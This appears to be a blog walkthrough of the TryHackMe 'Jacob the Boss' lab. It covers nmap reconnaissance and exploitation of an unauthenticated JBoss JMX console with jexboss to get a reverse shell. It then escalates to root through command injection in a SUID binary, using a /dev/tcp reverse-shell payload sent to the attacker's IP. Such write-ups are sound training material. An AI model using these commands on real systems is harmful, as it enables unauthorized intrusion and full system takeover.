---
layout: default
title : m3dsec - Jacob the Boss write-up
---

_**Sep 15, 2020**_

## Overview

Brief techniqual writeup explaining how we got a full access on [Jacob the Boss](https://tryhackme.com/room/jacobtheboss) machine from [tryhackme](https://tryhackme.com/)

<br>

## Target Informations

```
Externally accessible :
- IP ADDRESS  : 10.10.7.212
- DOMAIN NAME : jacobtheboss.thm - jacobtheboss.box
```

<br>

## DISCOVERY & RECONNAISSANCE

As the first step of this engagement, i'll start with an nmap scan including default script and services version enumeration.

```
m3dsec@local:~/jacobtheboss.thm$ nmap -v -sC -sV -oN nmap/nmap_tcp_simple 10.10.7.212
Nmap scan report for jacobtheboss.thm (10.10.173.140)
Host is up (0.096s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp open  mysql       MariaDB (unauthorized)
4444/tcp open  java-rmi    Java RMI
4445/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Unknown favicon MD5: 799F70B71314A7508326D1D2F68F7519
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss&trade;
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
```

Full ports scan up to 65515 is also a must.

```
m3dsec@local:~/jacobtheboss.thm$ nmap -v -p- -T4 -oN nmap/nmap_tcp_full 10.10.7.212
Nmap scan report for jacobtheboss.thm (10.10.173.140)
Host is up (0.085s latency).
Not shown: 65515 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
1090/tcp  open  ff-fms
1098/tcp  open  rmiactivation
1099/tcp  open  rmiregistry
3306/tcp  open  mysql
3873/tcp  open  fagordnc
4444/tcp  open  krb524
4445/tcp  open  upnotifyp
4446/tcp  open  n1-fwp
4457/tcp  open  prRegister
4712/tcp  open  unknown
4713/tcp  open  pulseaudio
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
8083/tcp  open  us-srv
36369/tcp open  unknown
38395/tcp open  unknown
47073/tcp open  unknown
```

without any further enumeration the **JBoss**  http service deployed on port 8083 Took my attention.

<br>


<h2 id="Validation-Exploitation">Validation & Exploitation</h2>


using the results of the reconnaissance as a starting point, and walking through the **JBoss** environment, we discovered that the **JMX Console** is beying deployed with no credentials. therefor we can upload and publish Web application ARchive (WAR) files remotely through this admin console, and compromize the network. 


we selectively chosed [jexboss](https://github.com/joaomatosf/jexboss) tool to automate the Exploitation part.


```
m3dsec@local:~/jacobtheboss.thm$ python ~/Tools/web_pentesting/jexboss/jexboss.py -host http://jacobtheboss.box:8080/
 ** Checking Host: http://jacobtheboss.box:8080/ **
 [*] Checking admin-console:                  [ OK ]
 [*] Checking Struts2:                        [ OK ]
 [*] Checking Servlet Deserialization:        [ OK ]
 [*] Checking Application Deserialization:    [ OK ]
 [*] Checking Jenkins:                        [ OK ]
 [*] Checking web-console:                    [ VULNERABLE ]
 [*] Checking jmx-console:                    [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:              [ VULNERABLE ]

 * Sending exploit code to http://jacobtheboss.box:8080/. Please wait...

 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.
   IP Address (RHOST): 10.9.123.226
   Port (RPORT): 9991
```

we successfully exploited the vulnerability in JBoss to get remote code execution and obtain a shell with user jacob privileges.

```
[jacob@jacobtheboss tmp]$ id   
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
```



<h2 id="Internal-Enumeration">Internal Enumeration</h2>

With an interactive access to the underlying OS on our target network, we continued with the examination of the system searching for ways to escalate privileges to the root level. We found a SUID file:

```
[jacob@jacobtheboss /]$ find / -perm -4000 -user root 2>/dev/null
/usr/bin/pingsys        <<---
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

<br>

Transferring the binary file Locally for a further analysis.
```
[jacob@jacobtheboss /]$ scp /usr/bin/pingsys m3dsec@10.9.123.226:/home/m3dsec/jacobtheboss.thm/files/pingsys
```

[Reverse Engeneering](https://en.wikipedia.org/wiki/Reverse_engineering) the binary shows that its taking arguments from the user.
```nasm
0x00400616   897ddc         mov dword [var_24h], edi    ; argc
0x00400619   488975d0       mov qword [var_30h], rsi    ; argv
```

and droping the user UID to 0 (root)
```nasm
0x004006a5      bf00000000     mov edi, 0
0x004006aa      e861feffff     call sym.imp.setuid
```

Then passing those arguments into system() function for execution.
```nasm
0x004006c3   488b45e0       mov rax, qword [var_20h]
0x004006c7   4889c7         mov rdi, rax
0x004006ca   e8f1fdffff     call sym.imp.system         ; int system(const char *string)
```

we can conclude that the SUID Binary file is vulnerble to [Command injection](https://owasp.org/www-community/attacks/Command_Injection).


<br>

<h2 id="ROOT-Privilege-escalation">ROOT - Privilege escalation</h2>

we can easly spawn a reverse shell, by injecting our payload in the arguments.

```
[jacob@jacobtheboss /]$ /usr/bin/pingsys '127.0.0.1;/bin/bash -i > /dev/tcp/10.9.123.226/9991 0>&1 2>&1'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.031 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.017/0.028/0.033/0.007 ms
```

And we successfully gained a root interactive shell on the compromised host.
```
m3dsec@local:~/jacobtheboss.thm$ nc -vnlp 9991
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9991
Ncat: Listening on 0.0.0.0:9991
Ncat: Connection from 10.10.9.96.
Ncat: Connection from 10.10.9.96:36850.
[root@jacobtheboss /]# id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
[root@jacobtheboss /]# cat /root/root.txt
29a5641e************************
```
<br>
Best Regards

[m3dsec](https://twitter.com/m3dsec).

<br>
<br>

[back to main()](../../index.md)

<br>
<br>
